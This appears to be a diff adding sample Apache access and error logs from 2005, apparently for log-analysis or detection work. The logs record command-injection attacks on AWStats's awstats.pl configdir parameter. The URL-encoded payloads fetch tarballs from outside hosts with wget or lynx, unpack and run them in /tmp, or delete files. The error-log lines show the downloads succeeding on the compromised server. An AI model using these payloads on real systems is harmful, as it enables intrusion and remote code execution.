@@ -1,0 +1,66 @@
+195.199.231.234 - - [12/Mar/2005:14:51:01 -0500] "GET /cgi-bin/awstats.pl?configdir=%20%7c%20cd%20%2ftmp%3bwget%20www.shady.go.ro%2fa.tgz%3b%20tar%20zxf%20a.tgz%3b%20rm%20-f%20a.tgz%3b%20.%2fa%20%7c%20 HTTP/1.1" 500 1097 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts)"
+198.54.202.4 - - [12/Mar/2005:14:51:47 -0500] "GET /cgi-bin/awstats.pl?configdir=%20%7c%20cd%20%2ftmp%3bwget%20www.shady.go.ro%2faw.tgz%3b%20tar%20zxf%20aw.tgz%3b%20rm%20-f%20aw.tgz%3b%20cd%20.aw%3b%20.%2finetd%20%7c%20 HTTP/1.1" 500 1097 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts)"
+212.203.66.69 - - [26/Feb/2005:22:10:52 -0500] "GET /cgi-bin/awstats.pl?configdir=%7cecho%20%3becho%20b_exp%3bcd%20%2ftmp%3bls%20%2dal%3becho%20e_exp%3b%2500 HTTP/1.1" 200 961 "-" "-"
+212.203.66.69 - - [26/Feb/2005:22:11:39 -0500] "GET /cgi-bin/awstats.pl?configdir=%7cecho%20%3becho%20b_exp%3bcd%20%2ftmp%3bls%20%2dal%3becho%20e_exp%3b%2500 HTTP/1.1" 200 961 "-" "-"
+212.203.66.69 - - [26/Feb/2005:22:12:22 -0500] "GET /cgi-bin/awstats.pl?configdir=%7cecho%20%3becho%20b_exp%3bcd%20%2ftmp%3bls%20%2dal%3becho%20e_exp%3b%2500 HTTP/1.1" 200 961 "-" "-"
+212.203.66.69 - - [26/Feb/2005:22:12:28 -0500] "GET /cgi-bin/awstats.pl?configdir=%7cecho%20%3becho%20b_exp%3bcd%20%2ftmp%3brm%20%2drf%20t%2a%3becho%20e_exp%3b%2500 HTTP/1.1" 200 515 "-" "-"
+212.203.66.69 - - [26/Feb/2005:22:08:57 -0500] "GET /cgi-bin/awstats.pl?configdir=%7cecho%20%3becho%20b_exp%3bcd%20%2ftmp%3blynx%20%2dsource%20www%2eadjud%2ego%2ero%2ft%2etgz%20%3e%20t%2etgz%3bls%20%2dla%3becho%20e_exp%3b%2500 HTTP/1.1" 200 942 "-" "-"
+212.203.66.69 - - [26/Feb/2005:22:11:17 -0500] "GET /cgi-bin/awstats.pl?configdir=%7cecho%20%3becho%20b_exp%3bcd%20%2ftmp%3blynx%20%2dsource%20www%2emaveric%2ecom%2ft%2etgz%20%3e%20t%2etgz%3bls%20%2dal%3becho%20e_exp%3b%2500 HTTP/1.1" 200 942 "-" "-"
+212.203.66.69 - - [26/Feb/2005:22:04:55 -0500] "GET /cgi-bin/awstats.pl?configdir=%7cecho%20%3becho%20b_exp%3bcd%20%2ftmp%3bwget%20www%2eadjud%2ego%2ero%2ft%2etgz%3btar%20zxvf%20t%2etgz%3b%2e%2ft%3becho%20e_exp%3b%2500 HTTP/1.1" 200 6 "-" "-"
+[Wed Mar 02 09:39:23 2005] [error] [client 82.52.98.248] --09:29:25--  http://www.shady.go.ro/a.tgz
+[Wed Mar 02 09:39:23 2005] [error] [client 82.52.98.248]            => `a.tgz'
+[Wed Mar 02 09:39:23 2005] [error] [client 82.52.98.248] Resolving www.shady.go.ro... done.
+[Wed Mar 02 09:39:23 2005] [error] [client 82.52.98.248] Connecting to www.shady.go.ro[81.196.20.134]:80... failed: Connection timed out.
+[Wed Mar 02 09:39:23 2005] [error] [client 82.52.98.248] --09:32:43--  http://www.shady.go.ro/a.tgz
+[Wed Mar 02 09:39:23 2005] [error] [client 82.52.98.248]   (try: 2) => `a.tgz'
+[Wed Mar 02 09:39:23 2005] [error] [client 82.52.98.248] Connecting to www.shady.go.ro[81.196.20.134]:80... failed: Connection timed out.
+[Wed Mar 02 09:39:23 2005] [error] [client 82.52.98.248] --09:35:54--  http://www.shady.go.ro/a.tgz
+[Wed Mar 02 09:39:23 2005] [error] [client 82.52.98.248]   (try: 3) => `a.tgz'
+[Wed Mar 02 09:39:23 2005] [error] [client 82.52.98.248] Connecting to www.shady.go.ro[81.196.20.134]:80... failed: Connection timed out.
+[Wed Mar 02 09:39:23 2005] [error] [client 82.52.98.248] --09:39:06--  http://www.shady.go.ro/a.tgz
+[Wed Mar 02 09:39:23 2005] [error] [client 82.52.98.248]   (try: 4) => `a.tgz'
+[Wed Mar 02 09:42:15 2005] [error] [client 82.52.98.248] Connecting to www.shady.go.ro[81.196.20.134]:80... failed: Connection timed out.
+[Wed Mar 02 09:42:19 2005] [error] [client 82.52.98.248] --09:42:19--  http://www.shady.go.ro/a.tgz
+[Wed Mar 02 09:42:19 2005] [error] [client 82.52.98.248]   (try: 5) => `a.tgz'
+[Wed Mar 02 09:45:28 2005] [error] [client 82.52.98.248] Connecting to www.shady.go.ro[81.196.20.134]:80... failed: Connection timed out.
+[Wed Mar 02 09:45:33 2005] [error] [client 82.52.98.248] --09:45:33--  http://www.shady.go.ro/a.tgz
+[Wed Mar 02 09:45:33 2005] [error] [client 82.52.98.248]   (try: 6) => `a.tgz'
+[Wed Mar 02 09:48:42 2005] [error] [client 82.52.98.248] Connecting to www.shady.go.ro[81.196.20.134]:80... failed: Connection timed out.
+[Wed Mar 02 09:48:48 2005] [error] [client 82.52.98.248] --09:48:48--  http://www.shady.go.ro/a.tgz
+[Wed Mar 02 09:48:48 2005] [error] [client 82.52.98.248]   (try: 7) => `a.tgz'
+[Wed Mar 02 09:51:57 2005] [error] [client 82.52.98.248] Connecting to www.shady.go.ro[81.196.20.134]:80... failed: Connection timed out.
+[Wed Mar 02 09:52:04 2005] [error] [client 82.52.98.248] --09:52:04--  http://www.shady.go.ro/a.tgz
+[Wed Mar 02 09:52:04 2005] [error] [client 82.52.98.248]   (try: 8) => `a.tgz'
+[Wed Mar 02 09:55:13 2005] [error] [client 82.52.98.248] Connecting to www.shady.go.ro[81.196.20.134]:80... failed: Connection timed out.
+[Wed Mar 02 09:55:21 2005] [error] [client 82.52.98.248] --09:55:21--  http://www.shady.go.ro/a.tgz
+[Wed Mar 02 09:55:21 2005] [error] [client 82.52.98.248]   (try: 9) => `a.tgz'
+[Wed Mar 02 09:58:30 2005] [error] [client 82.52.98.248] Connecting to www.shady.go.ro[81.196.20.134]:80... failed: Connection timed out.
+[Wed Mar 02 09:58:39 2005] [error] [client 82.52.98.248] --09:58:39--  http://www.shady.go.ro/a.tgz
+[Wed Mar 02 09:58:39 2005] [error] [client 82.52.98.248]   (try:10) => `a.tgz'
+[Wed Mar 02 09:59:25 2005] [error] [client 82.52.98.248] Connecting to www.shady.go.ro[81.196.20.134]:80... connected.
+[Wed Mar 02 09:59:25 2005] [error] [client 82.52.98.248] HTTP request sent, awaiting response... 200 O
+[Sat Feb 26 14:13:56 2005] [error] [client 213.135.2.227] --14:13:41--  http://www.shady.go.ro/aw.tgz
+[Sat Feb 26 14:13:56 2005] [error] [client 213.135.2.227]            => `aw.tgz'
+[Sat Feb 26 14:13:56 2005] [error] [client 213.135.2.227] Resolving www.shady.go.ro... done.
+[Sat Feb 26 14:13:56 2005] [error] [client 213.135.2.227] Connecting to www.shady.go.ro[81.196.20.134]:80... connected.
+[Sat Feb 26 14:13:56 2005] [error] [client 213.135.2.227] HTTP request sent, awaiting response... 200 OK
+[Sat Feb 26 14:13:56 2005] [error] [client 213.135.2.227] Length: 205,207 [text/plain]
+[Sat Feb 26 14:13:56 2005] [error] [client 213.135.2.227]     0K .......... .......... .......... .......... .......... 24%   59.03 KB/s
+[Sat Feb 26 14:13:56 2005] [error] [client 213.135.2.227]    50K .......... .......... .......... .......... .......... 49%  101.01 KB/s
+[Sat Feb 26 14:13:56 2005] [error] [client 213.135.2.227]   100K .......... .......... .......... .......... .......... 74%   21.35 KB/s
+[Sat Feb 26 14:13:56 2005] [error] [client 213.135.2.227]   150K .......... .......... .......... .......... .......... 99%   50.00 KB/s
+[Sat Feb 26 14:13:56 2005] [error] [client 213.135.2.227]   200K                                                       100%  397.46 KB/s
+[Sat Feb 26 14:13:56 2005] [error] [client 213.135.2.227] 14:13:56 (42.78 KB/s) - `aw.tgz' saved [205207/205207]
+[Sat Feb 26 14:13:56 2005] [error] [client 213.135.2.227] sh: /awstats.11.11.79.89.conf: No such file or directory
+[Sat Feb 26 14:14:59 2005] [error] [client 82.55.78.243] --14:14:45--  http://www.shady.go.ro/aw.tgz
+[Sat Feb 26 14:14:59 2005] [error] [client 82.55.78.243]            => `aw.tgz'
+[Sat Feb 26 14:14:59 2005] [error] [client 82.55.78.243] Resolving www.shady.go.ro... done.
+[Sat Feb 26 14:14:59 2005] [error] [client 82.55.78.243] Connecting to www.shady.go.ro[81.196.20.134]:80... connected.
+[Sat Feb 26 14:14:59 2005] [error] [client 82.55.78.243] HTTP request sent, awaiting response... 200 OK
+[Sat Feb 26 14:14:59 2005] [error] [client 82.55.78.243] Length: 205,207 [text/plain]
+[Sat Feb 26 14:14:59 2005] [error] [client 82.55.78.243]     0K .......... .......... .......... .......... .......... 24%   59.03 KB/s
+[Sat Feb 26 14:14:59 2005] [error] [client 82.55.78.243]    50K .......... .......... .......... .......... .......... 49%  101.01 KB/s
+[Sat Feb 26 14:14:59 2005] [error] [client 82.55.78.243]   100K .......... .......... .......... .......... .......... 74%   20.51 KB/s
+[Sat Feb 26 14:14:59 2005] [error] [client 82.55.78.243]   150K .......... .......... .......... .......... .......... 99%   50.00 KB/s
+[Sat Feb 26 14:14:59 2005] [error] [client 82.55.78.243]   200K                                                       100%  397.46 KB/s
+[Sat Feb 26 14:14:59 2005] [error] [client 82.55.78.243] 14:14:58 (41.92 KB/s) - `aw.tgz' saved [205207/205207]
